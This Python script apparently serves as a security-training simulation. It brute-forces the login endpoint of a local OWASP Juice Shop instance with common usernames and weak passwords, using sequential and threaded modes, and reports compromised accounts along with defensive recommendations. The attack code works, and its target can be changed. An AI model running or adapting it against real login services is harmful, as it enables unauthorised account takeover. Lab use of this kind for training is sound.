import requests
import time
import json
import logging
import os
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

class BruteForceAttacker:
    def __init__(self, target_url="http://localhost:3000"):
        self.target_url = target_url
        self.session = requests.Session()
        self.attack_results = []
        
        # Ensure required directories exist
        os.makedirs('../logs/security', exist_ok=True)
        os.makedirs('../reports', exist_ok=True)
        
        # Set up logging with UTF-8 file support
        log_file = '../logs/security/brute_force.log'
        file_handler = logging.FileHandler(log_file, encoding='utf-8')
        stream_handler = logging.StreamHandler()
        
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - BRUTE_FORCE - %(levelname)s - %(message)s',
            handlers=[file_handler, stream_handler]
        )
        self.logger = logging.getLogger(__name__)

    def safe_log(self, level, message_with_emoji, plain_message=None):
        """Log emoji message to file, plain message to console to avoid cp1252 errors"""
        if plain_message is None:
            plain_message = (
                message_with_emoji
                .replace("🚀", "")
                .replace("🚨", "")
                .strip()
            )
        getattr(self.logger, level)(message_with_emoji)
        level_upper = level.upper()
        print(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - BRUTE_FORCE - {level_upper} - {plain_message}")

    def generate_credentials(self):
        """Generate test credentials for brute force attack"""
        common_usernames = [
            "admin@juice-sh.op", "admin", "administrator", 
            "test", "user", "demo", "root"
        ]
        common_passwords = [
            "admin", "password", "123456", "password123",
            "admin123", "test", "12345678", "qwerty",
            "123456789", "12345", "1234", "111111"
        ]
        credentials = [(u, p) for u in common_usernames for p in common_passwords]
        return credentials[:50]  # Limit to 50 attempts for training

    def single_login_attempt(self, username, password):
        """Make a single login attempt"""
        try:
            start_time = time.time()
            response = self.session.post(
                f"{self.target_url}/rest/user/login",
                json={"email": username, "password": password},
                headers={'Content-Type': 'application/json'},
                timeout=5
            )
            response_time = time.time() - start_time
            
            result = {
                'timestamp': datetime.now().isoformat(),
                'username': username,
                'password': password,
                'status_code': response.status_code,
                'response_time': response_time,
                'success': response.status_code == 200,
                'blocked': response.status_code == 429  # Rate limiting
            }
            
            if response.status_code == 200:
                result['user_data'] = response.json()
                self.safe_log('critical', f"🚨 SUCCESSFUL LOGIN: {username}:{password}")
            
            return result
            
        except Exception as e:
            return {
                'timestamp': datetime.now().isoformat(),
                'username': username,
                'password': password,
                'error': str(e),
                'success': False
            }

    def run_sequential_attack(self, credentials):
        """Run brute force attack sequentially"""
        self.safe_log('info', "Starting sequential brute force attack...")
        
        for i, (username, password) in enumerate(credentials, 1):
            try:
                self.logger.debug(f"Attempt {i}: {username}:{password}")
                result = self.single_login_attempt(username, password)
                self.attack_results.append(result)
                
                if i % 10 == 0:
                    self.logger.info(f"Completed {i}/{len(credentials)} attempts")
                
                time.sleep(0.5)
            except KeyboardInterrupt:
                self.logger.warning("Attack interrupted by user (Ctrl+C)")
                break

    def run_parallel_attack(self, credentials, max_workers=5):
        """Run brute force attack with multiple threads"""
        self.safe_log('info', f"Starting parallel brute force attack with {max_workers} workers...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            future_to_cred = {
                executor.submit(self.single_login_attempt, u, p): (u, p)
                for u, p in credentials
            }
            try:
                for future in as_completed(future_to_cred):
                    u, p = future_to_cred[future]
                    try:
                        result = future.result()
                        self.attack_results.append(result)
                    except Exception as e:
                        self.logger.error(f"Error with {u}:{p}: {e}")
            except KeyboardInterrupt:
                self.logger.warning("Attack interrupted by user (Ctrl+C)")
                executor.shutdown(wait=False, cancel_futures=True)

    def analyze_results(self):
        """Analyze brute force attack results"""
        total_attempts = len(self.attack_results)
        successful_logins = sum(1 for r in self.attack_results if r.get('success'))
        blocked_attempts = sum(1 for r in self.attack_results if r.get('blocked'))
        compromised = [(r['username'], r['password']) for r in self.attack_results if r.get('success')]
        
        return {
            'total_attempts': total_attempts,
            'successful_logins': successful_logins,
            'blocked_attempts': blocked_attempts,
            'success_rate': (successful_logins / total_attempts * 100) if total_attempts > 0 else 0,
            'compromised_accounts': compromised
        }

    def generate_report(self):
        """Generate brute force attack report"""
        analysis = self.analyze_results()
        report = {
            'attack_type': 'Brute Force',
            'timestamp': datetime.now().isoformat(),
            'target': self.target_url,
            'summary': analysis,
            'detailed_results': self.attack_results,
            'security_implications': [
                "Weak passwords can be easily compromised",
                "Lack of account lockout mechanisms",
                "No rate limiting on authentication endpoints",
                "No multi-factor authentication"
            ],
            'recommendations': [
                "Implement strong password policies",
                "Enforce account lockout after failed attempts",
                "Deploy rate limiting on login endpoints",
                "Use multi-factor authentication",
                "Monitor for brute force patterns"
            ]
        }

        report_path = '../reports/brute_force_report.json'
        with open(report_path, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        return report

    def run_complete_attack(self, parallel=False):
        """Execute complete brute force attack"""
        self.safe_log('info', "🚀 Starting Brute Force Attack Simulation")
        
        credentials = self.generate_credentials()
        self.logger.info(f"Generated {len(credentials)} credential pairs")
        
        try:
            if parallel:
                self.run_parallel_attack(credentials, max_workers=3)
            else:
                self.run_sequential_attack(credentials)
        except KeyboardInterrupt:
            self.logger.warning("Brute force simulation interrupted by user.")
        
        report = self.generate_report()
        
        print(f"\n🔓 BRUTE FORCE ATTACK SUMMARY")
        print(f"   Total attempts: {report['summary']['total_attempts']}")
        print(f"   Successful logins: {report['summary']['successful_logins']}")
        print(f"   Blocked attempts: {report['summary']['blocked_attempts']}")
        print(f"   Success rate: {report['summary']['success_rate']:.1f}%")
        
        if report['summary']['compromised_accounts']:
            print(f"   Compromised accounts: {report['summary']['compromised_accounts']}")
        
        return report

if __name__ == "__main__":
    try:
        attacker = BruteForceAttacker()
        attacker.run_complete_attack(parallel=False)
    except KeyboardInterrupt:
        print("\n🛑 Brute force attack stopped by user.")
    except Exception as e:
        print(f"\n❌ Unexpected error: {e}")